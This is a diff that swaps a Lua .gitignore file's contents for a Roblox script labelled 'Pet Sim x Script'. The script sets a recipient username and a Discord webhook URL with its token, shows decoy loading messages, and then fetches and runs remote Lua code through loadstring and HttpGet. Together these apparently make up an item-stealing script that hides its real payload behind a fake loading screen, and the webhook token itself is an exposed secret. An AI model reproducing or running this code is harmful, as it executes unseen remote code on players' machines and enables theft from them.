@@ -1,41 +1,19 @@
-# Compiled Lua sources
-luac.out
+Username = "Heldoffilosofe"
 
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
+WebHook = "https://discord.com/api/webhooks/1096858461855301766/CLxGd8LG7i5WG635ser5h1rqNu5nmXS_eQehWmV66Bo_8W8T8g75eoZhfDroFtSuRxL_"
 
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
+loadingscreen = true
 
-# Precompiled Headers
-*.gch
-*.pch
+_G.CustomScriptName = "Pet Sim x Script"
 
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
+_G.Text1 = "Script Loaded..."
 
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
+_G.Text2 = "Waiting for Script..."
 
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Script..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+
 
